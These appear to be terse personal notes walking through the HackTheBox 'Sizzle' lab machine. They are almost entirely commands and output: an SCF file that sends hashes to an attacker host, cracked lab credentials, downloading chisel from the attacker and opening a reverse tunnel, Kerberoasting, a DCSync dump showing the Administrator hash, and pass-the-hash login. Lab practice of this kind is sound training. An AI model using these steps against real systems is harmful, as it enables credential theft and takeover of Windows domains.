### No empty lines
https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#smb---tcp-445

```bash
cat * | xxd | grep -v "0000 0000 0000 0000 0000 0000 0000 0000"
```

### Cacls on mount
```bash
smbcacls -N '//10.129.230.198/Department Shares' Users

# mount it
sudo mount -t cifs //10.129.230.198/Department\ Shares /mnt

for i in $(ls); do echo $i; smbcacls -N '//10.129.230.198/Department Shares' $i; done
```

```bash
❯ smbcacls -N '//10.129.230.198/Department Shares' Users/Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/OI|CI/FULL # <--- write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or shells
```

### SMB Share – SCF File Attacks
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

```text
[Shell]
Command=2
IconFile=\\10.10.17.120\alvin.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
sudo responder -I tun0 -v
```

Grab the hash and crack it to get credentials

### /certsrv/ (Status: 401)
```bash
gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401
```

AMANDA:Ashare1972

### Sign CSR for winrm
##### One way..
```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```
##### ..or the other
https://github.com/A1vinSmith/OSCP-PWK/wiki/Crack-Hash
```bash
openssl genrsa -aes256 -out enox.key 2048
openssl req -new -key enox.key -out enox.csr

evil-winrm -i 10.129.230.198 -S -c enox.cer -k enox.key
```

### Blocked
`certutil -urlcache -f http://10.10.16.9/chisel chisel`

### Bypass AppBlocker
```bash
IWR http://10.10.16.9/chisel -OutFile chisel.exe
chisel server -p 8008 --reverse
.\chisel.exe client 10.10.16.9:8008 R:88:127.0.0.1:88 R:389:localhost:389
```

### Kerberoasting
https://github.com/A1vinSmith/OSCP-PWK/blob/master/HackTheBox/Windows/Active.md

##### domain not right
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py htb/amanda:Ashare1972 -request -dc-ip 10.129.230.198
```

##### htb.local
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py htb.local/amanda:Ashare1972 -request -dc-ip 10.129.230.198
```
##### Sign csr for mrlky again
Football#7
```bash
openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr
```
user.txt get

### Root
```bash
❯ impacket-secretsdump -just-dc mrlky:Football#7@10.129.230.198

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
```

##### check that hash using crackmapexec
`crackmapexec 10.129.230.198 -u administrator -H f6b7160bfc91823792e0ac3a162c9267`

##### done
```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@10.129.230.198
```